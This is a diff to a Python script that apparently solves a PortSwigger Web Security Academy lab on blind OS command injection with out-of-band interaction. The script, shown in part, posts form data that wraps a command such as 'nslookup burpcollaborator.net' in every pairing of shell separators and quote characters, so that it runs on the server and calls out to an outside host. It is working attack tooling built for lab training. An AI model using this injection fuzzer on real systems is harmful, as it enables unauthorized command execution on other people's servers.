@@ -5,11 +5,9 @@ import itertools
 
 # Code to solve lab in WSA - 'Blind OS command injection with out-of-band interaction'
 # See: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
-# Run command: python3 poster.py $form_url email nslookup burpcollaborator.net
+# Run command: python3 blind_OAST_poster.py $form_url email nslookup burpcollaborator.net
 
-payload = ['|', '||', '&', '&&', ';', '%0a', '#', '`', '\n']
-start_str = ['', '\'', '"']
-
+# First get web page for csrf_token, then inject the code through a post request
 def poster(form_url, attack_field, command, prefix, suffix):
     with requests.Session() as s:
        # Get cookie
@@ -27,12 +25,16 @@ def poster(form_url, attack_field, command, prefix, suffix):
        resp = s.post(form_url+"/submit", data=data)
        print("Response: " + resp.text)
 
+# Getting command line args
 form_url=sys.argv[1]
 attack_field=sys.argv[2] # E.g. email
 cmd=' '.join(sys.argv[3:])
 print("Command", cmd)
 
-for start in start_str: # '', '\'', '"'
+# Iterating through attack payloads
+payload = ['|', '||', '&', '&&', ';', '%0a', '#', '`', '\n']
+start_str = ['', '\'', '"'] # In case the field we are attacking is fed into a string, we must first end the string before executing our command
+for start in start_str:
     for subset in itertools.combinations_with_replacement(payload, 2):
         prefix = subset[0]
         suffix = subset[1]
